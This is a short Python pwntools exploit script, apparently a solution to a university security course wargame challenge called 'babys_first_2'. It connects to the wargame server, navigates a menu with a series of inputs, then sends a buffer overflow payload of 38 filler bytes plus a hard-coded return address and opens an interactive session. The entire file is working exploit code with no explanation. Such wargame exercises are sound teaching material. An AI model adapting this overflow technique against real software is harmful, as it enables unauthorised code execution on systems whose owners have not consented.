#!/usr/bin/python

from pwn import *

#c = process("./babys_first_2")
c = remote("wargames.6447.sec.edu.au", 9002)

call = 0x080486c0

c.recvuntil('>')
c.sendline("1")
c.recvuntil('>')
c.sendline("1")
c.recvuntil('>')
c.sendline("1")
c.recvuntil('>')
c.sendline("1")
c.recvuntil('>')
c.sendline("aaaa")

c.recvuntil('>')
c.sendline("4")
c.recvuntil('>')
c.sendline("1")

c.recvuntil('>')
c.sendline("1")
c.recvuntil('>')
c.sendline("2")
c.recvuntil('>')
c.sendline("1")
c.recvuntil('>')
c.sendline("1")
c.recvuntil('>')

payload = "a"*38
payload += p32(call)

c.sendline(payload)

c.recvuntil('>')

c.sendline("3")

c.recvuntil('>')
c.sendline("1")

c.interactive()
